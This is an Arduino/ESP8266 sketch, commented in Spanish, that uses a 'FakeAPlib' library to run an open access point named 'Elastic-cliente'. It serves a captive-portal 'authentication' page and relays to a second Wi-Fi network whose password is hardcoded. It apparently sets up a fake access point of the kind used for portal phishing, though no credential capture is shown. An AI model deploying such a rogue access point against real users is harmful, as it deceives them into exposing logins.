#include <FakeAPlib.h>


//variable para el nombre del wifi
const char* SSID      = "Elastic-cliente";  // nombre del punto de acceso
const char* WIFI_SSID = "ESP.local-server"; // nombre de la wifi del servidor
const char* WIFI_PSW  = "SECUREhash9361";   // contraseña de la wifi del servidor

const char* AUTH_PAGE  = "/webpages/index.html"; //ruta de la pagina de inicio (del portal cautivo)

IPAddress* apip = new IPAddress(192,168,1,1);  //dirección IP de la red del punto de acceso

FakeAP* accessPoint = new FakeAP(80); // iniciar un servidor el puerto 80
										                  // en caso de no indicar ninguno, el puerto por defecto es 80
int printed = 0;


void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Cargando....");
  delay(1000);
  
  //metodo para definir las rutas de las paginas
	//el primer argumento es la ruta y el segundo es el tipo de archivo
  accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);

  //[opcional] configuración del modo de la wifi y del nombre de host
  WiFi.mode(WIFI_AP);
  WiFi.hostname("ESP.accesspoint");

  //configuración de la ip de la red, el gateway y la mascara de subred
  WiFi.softAPConfig(*apip, *apip, IPAddress(255, 255, 255, 0));
  //estas configuraciones se tienen que hacer antes de iniciar el punto de acceso

  //iniciar el punto de acceso y el servidor, y conectarse a la wifi inidicada (la del servidor)
  if (!accessPoint->initialize(SSID, "", WIFI_SSID, WIFI_PSW))
    Serial.println("Error en la configuración del punto de acceso");
  //este modo solo inicia el punto de acceso y el servidor si no  se inidica ninguna wifi
	//las contraseñas de las redes wifi son opcionales

  Serial.println("Configuración acabada!");

}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    Serial.printf("server ip: %s\n", accessPoint->getServerIp().toString().c_str());
    Serial.println("En espera de clientes....");
    printed++;
  }

}
